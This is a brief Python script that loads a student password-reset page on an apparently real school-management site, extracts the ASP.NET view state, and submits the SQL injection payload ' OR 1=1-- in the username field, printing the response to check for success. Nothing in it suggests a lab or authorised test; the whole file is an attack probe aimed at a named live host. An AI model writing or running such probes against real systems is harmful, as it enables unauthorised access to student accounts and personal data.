import requests, re, html

session = requests.Session()
url = "https://econnectapp.jupsoft.com/sisForgetPasswordForStudent.aspx?id=cV4a3WL%20MHg="

r = session.get(url)
content = r.text

vs = html.unescape(re.search(r'__VIEWSTATE" value="([^"]+)"', content).group(1))

# Try SQLi on the username field
r2 = session.post(url, data={
    "__VIEWSTATE": vs,
    "txtUserName": "' OR 1=1--",
    "btnForgetPassword": "Submit"
})
print(f"Length: {len(r2.text)}")
if len(r2.text) > 5000:
    print(r2.text[:1000])
